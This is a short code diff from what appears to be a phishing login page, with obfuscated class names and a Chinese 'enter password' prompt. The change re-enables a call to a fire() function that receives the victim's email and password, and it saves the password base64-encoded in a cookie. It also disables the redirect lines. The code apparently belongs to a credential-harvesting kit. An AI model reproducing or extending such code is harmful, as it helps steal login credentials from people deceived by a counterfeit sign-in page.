@@ -175,14 +175,14 @@
                 Cookies.set("x", 1000);
                 if(atob(Cookies.get("x-user-fire"))==document.getElementById('pw').value) {
                     Cookies.set("x", 1001);
-                    location.href = atob(Cookies.get("r"));
+                    //location.href = atob(Cookies.get("r"));
                     return;
-                }/*else if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
+                }else if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
                     Cookies.set("x", 1002);
                     Cookies.set("x-user-fire", btoa(document.getElementById('pw').value));
-                }*/
+                }
                 Cookies.set("x", 1003);
-                location.href = atob(Cookies.get("r"));
+                //location.href = atob(Cookies.get("r"));
             } else {
                 document.getElementById('password').className += ' k0tWj IYewr';
                 document.getElementById('DDFo').innerHTML = '輸入密碼';
